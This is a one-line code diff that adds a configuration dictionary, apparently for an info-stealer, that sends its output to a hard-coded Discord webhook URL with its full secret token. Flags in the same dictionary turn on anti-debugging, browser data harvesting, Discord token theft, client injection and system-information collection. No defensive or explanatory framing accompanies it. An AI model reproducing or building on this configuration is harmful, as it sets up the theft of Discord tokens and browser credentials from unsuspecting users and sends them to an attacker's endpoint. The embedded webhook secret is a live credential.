@@ -1,0 +1,1 @@
+__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1062036536088072212/M7eCc6BvjW_Ulu8wRzWja6ktZ0pKRolVuOLlS85kutE7yDZh4FroRtsgNB9mwpltgloZ', 'antidebug': True, 'browsers': True, 'discordtoken': True, 'injection': True, 'startup': False, 'systeminfo': True}
